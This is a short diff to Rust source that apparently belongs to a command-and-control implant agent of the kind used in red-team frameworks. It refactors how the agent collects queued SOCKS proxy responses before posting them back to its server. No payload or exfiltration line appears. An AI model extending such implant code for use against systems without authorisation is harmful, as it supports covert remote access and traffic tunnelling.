@@ -1,7 +1,7 @@
 use crate::payloadvars;
 use crate::tasking::Tasker;
 use crate::profiles::Profile;
-use crate::socks::{SocksMsg, SOCKS_INBOUND_QUEUE, SOCKS_OUTBOUND_QUEUE};
+use crate::socks::{SocksMsg, SOCKS_INBOUND_QUEUE, process_socks_messages_sync, get_socks_responses};
 use chrono::prelude::{DateTime, Local, NaiveDate, NaiveDateTime, NaiveTime};
 use chrono::Duration;
 use rand::Rng;
@@ -181,13 +181,8 @@ impl Agent {
         &mut self,
         completed: &[serde_json::Value],
     ) -> Result<Option<Vec<AgentTask>>, Box<dyn Error>> {
-        // Retrieve and clear SOCKS outbound queue
-        let socks_to_send = {
-            let mut q = SOCKS_OUTBOUND_QUEUE.lock().unwrap();
-            let v = q.clone();
-            q.clear();
-            v
-        };
+        // Retrieve SOCKS responses from the outbound queue
+        let socks_to_send = get_socks_responses();
 
         let body = PostTaskingResponse {
             action: "post_response".to_string(),
